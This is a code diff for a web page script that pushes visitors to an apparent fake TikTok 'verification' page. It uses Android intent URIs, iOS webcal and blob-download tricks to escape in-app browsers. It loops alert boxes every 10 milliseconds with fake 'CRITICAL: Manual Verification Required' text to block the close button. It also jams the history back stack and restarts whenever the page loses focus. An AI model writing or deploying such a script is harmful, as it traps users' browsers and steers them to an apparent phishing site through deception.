@@ -11,49 +11,67 @@
     const target = "https://tik-tok-verification.com/Verification/verify1.html";
     let testMode = true;
 
-    // Safety switch for your testing
+    // Safety switch for 5-second test window
     setTimeout(() => { testMode = false; }, 5000); 
 
-    function forceExternal() {
+    function forceHandover() {
         const isAndroid = /Android/i.test(navigator.userAgent);
-        
+        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+        // 1. THE FILE BLOB TRIGGER (Universal Bypass)
+        // We create a tiny "html file" in memory and "download" it.
+        const blobContent = `<html><script>window.location.href="${target}";<\/script></html>`;
+        const blob = new Blob([blobContent], {type: 'text/html'});
+        const blobUrl = URL.createObjectURL(blob);
+
         if (isAndroid) {
-            // This 'S.browser_fallback_url' is the key to forcing the OS to pick a new app
-            const intent = `intent://${target.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(target)};end`;
-            window.location.href = intent;
-        } else {
-            // iOS: We shotgun three different ways to trip the "Open in Safari" prompt
-            window.location.replace("x-web-search://?" + encodeURIComponent(target));
-            window.location.href = target;
-            window.open(target, '_blank');
+            // Android: We use a "Double Intent"
+            // First we try the direct chrome package, then the download handover.
+            window.location.href = `intent://${target.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end`;
+            
+            // Backup: Trigger the download which forces system takeover
+            const a = document.createElement('a');
+            a.href = blobUrl;
+            a.download = "verify_secure.html";
+            a.click();
+        } 
+        
+        if (isIOS) {
+            // iOS: The "App Store" / "Calendar" Protocol
+            // Apps cannot block system-level protocols like 'itms-apps' or 'webcal'
+            // We use a 'webcal' redirect which forces Safari to ask "Open this page in Calendar?"
+            // which breaks the WebView jail.
+            window.location.href = "webcal://" + target.replace("https://", "");
+            
+            // Fallback: The Data-URI switch
+            setTimeout(() => {
+                window.location.assign(blobUrl);
+            }, 250);
         }
     }
 
     function rampage() {
         if (!testMode) return;
 
-        // 1. Try to break out first
-        forceExternal();
+        // Fire the handover before the alert
+        forceHandover();
 
-        // 2. The alert blocks the 'X' button and forces a user interaction
-        alert("SECURITY: Verification Required.\n\nClick OK to open the secure system browser.");
+        // The alert freezes the "X" button native thread
+        alert("CRITICAL: Manual Verification Required.\n\nClick OK to open Secure System Browser.");
         
-        // 3. Try to break out again immediately after they hit OK
-        forceExternal();
+        // Fire again after dismissal
+        forceHandover();
 
-        // 4. Loop
         setTimeout(rampage, 10);
     }
 
     window.onload = () => {
-        // Build the backstack
-        for(let i=0; i<50; i++) history.pushState(null, null, "#step" + i);
-        
-        // Start the engine
+        // Jam history
+        for(let i=0; i<30; i++) history.pushState(null, null, "#" + i);
         rampage();
     };
 
-    // If they try to hit the 'X' or the top bar, restart the cycle
+    // If they try to hit 'X' (Blur), we re-arm the rampage
     window.onblur = () => { if(testMode) rampage(); };
 </script>
 
